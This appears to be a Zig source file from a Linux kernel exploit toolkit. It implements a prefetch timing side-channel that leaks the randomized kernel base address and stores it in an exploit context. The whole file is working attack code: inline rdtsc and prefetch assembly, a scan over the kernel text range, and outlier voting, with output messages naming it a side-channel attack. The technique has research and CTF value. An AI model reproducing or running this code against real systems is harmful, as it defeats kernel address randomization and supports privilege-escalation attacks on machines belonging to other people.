const std = @import("std");
const ctx_mod = @import("context.zig");

fn measure_prefetch_time(addr: u64) u64 {
    return asm volatile (
        \\rdtsc
        \\mov %%rdx, %%r8
        \\shl $32, %%r8
        \\or %%rax, %%r8
        \\lfence
        \\prefetchnta (%[addr])
        \\prefetcht2 (%[addr])
        \\lfence
        \\rdtsc
        \\shl $32, %%rdx
        \\or %%rdx, %%rax
        \\sub %%r8, %%rax
        : [ret] "={rax}" (-> u64),
        : [addr] "r" (addr),
        : .{ .rdx = true, .r8 = true, .memory = true }
    );
}

fn find_outlier_index(times: []const u64) usize {
    if (times.len == 0) {
        return 0;
    }

    var mean: f64 = 0.0;
    for (times) |t| {
        mean += @as(f64, @floatFromInt(t));
    }
    mean /= @as(f64, @floatFromInt(times.len));

    var max_diff: f64 = -1.0;
    var outlier_idx: usize = 0;
    for (times, 0..) |t, i| {
        const diff = @abs(@as(f64, @floatFromInt(t)) - mean);
        if (diff > max_diff) {
            max_diff = diff;
            outlier_idx = i;
        }
    }

    return outlier_idx;
}

// requires `-enable-kvm`
pub fn prefetch_kbase() u64 {
    std.debug.print("[ ] finding kbase by prefetch side-channel attack\n", .{});

    var num_trials: u64 = 10;
    const num_vote: usize = 10;
    const start: u64 = 0xffffffff81000000;
    const end: u64 = 0xffffffffc0000000;
    const step: u64 = 0x40000;
    const num_steps: usize = @intCast((end - start) / step);

    while (num_trials > 0) : (num_trials -= 1) {
        var cand_addr: [num_vote]u64 = undefined;
        var min_time: [num_steps]u64 = undefined;

        var vote: usize = 0;
        while (vote < num_vote) : (vote += 1) {
            for (&min_time) |*v| {
                v.* = std.math.maxInt(u64);
            }

            var num_prefetch: u64 = 16;
            while (num_prefetch > 0) : (num_prefetch -= 1) {
                var i: usize = 0;
                while (i < num_steps) : (i += 1) {
                    const addr = start + step * @as(u64, @intCast(i));
                    const time = measure_prefetch_time(addr);
                    if (time < min_time[i]) {
                        min_time[i] = time;
                    }
                }
            }

            const outlier_index = find_outlier_index(min_time[0..]);
            cand_addr[vote] = (start + step * @as(u64, @intCast(outlier_index))) & ~@as(u64, 0xfffff);
        }

        var i: usize = 0;
        while (i < num_vote) : (i += 1) {
            const addr = cand_addr[i];
            var count: usize = 0;

            var j: usize = 0;
            while (j < num_vote) : (j += 1) {
                if (addr == cand_addr[j]) {
                    count += 1;
                }
            }

            if (count > (num_vote / 2)) {
                std.debug.print("[+] found kbase by prefetch side-channel attack\n", .{});
                std.debug.print("[+] kbase = 0x{x}\n", .{addr});
                return addr;
            }
        }
    }

    std.debug.print("[-] unable to detect kbase by prefetch side-channel attack\n", .{});
    return 0;
}

pub fn set_kbase(ctx: *ctx_mod.ctx) void {
    ctx.kbase = prefetch_kbase();
}
